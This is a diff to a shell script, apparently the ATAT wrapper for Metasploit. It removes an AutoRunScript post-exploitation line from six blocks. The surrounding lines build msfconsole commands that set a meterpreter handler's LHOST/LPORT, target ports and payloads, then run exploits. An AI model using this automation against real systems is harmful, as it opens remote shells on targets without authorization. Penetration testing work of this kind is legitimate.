@@ -287,7 +287,6 @@ do
             echo set LHOST $userhost >> ~/Desktop/temp/meterpreter.rc
             echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
             echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
-            echo set AutoRunScript /root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
             echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
             cat ~/Desktop/temp/meterpreter.rc
             xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
@@ -378,7 +377,6 @@ do
 	set RPORT $targetport;\
 	set PAYLOAD $userpayload;\
 	set DisablePayloadHandler true;\
-	set AutoRunScript /root/ATAT/postex.rc;\
 	run;\
 	exit"
 	done
@@ -416,7 +414,6 @@ do
 	set RPORT $PORT;\
 	set PAYLOAD $userpayload;\
 	set DisablePayloadHandler true;\
-	set AutoRunScript /root/ATAT/postex.rc;\
 	run;\
 	exit"
 	done
@@ -486,7 +483,6 @@ do
 	set PAYLOAD $userpayload;\
 	set TARGETURI $useruri;\
 	set DisablePayloadHandler true;\
-	set AutoRunScript /root/ATAT/postex.rc;\
 	run;\
 	exit"
 	done
@@ -525,7 +521,6 @@ do
 	set PAYLOAD $userpayload;\
 	set JMXRMI $userjmxrmi;\
 	set DisablePayloadHandler true;\
-	set AutoRunScript /root/ATAT/postex.rc;\
 	run;\
 	exit"
 	done
@@ -564,7 +559,6 @@ do
 	set PAYLOAD $userpayload;\
 	set HTTPDELAY $userdelay;\
 	set DisablePayloadHandler true;\
-	set AutoRunScript /root/ATAT/postex.rc;\
 	run;\
 	exit"
 	done
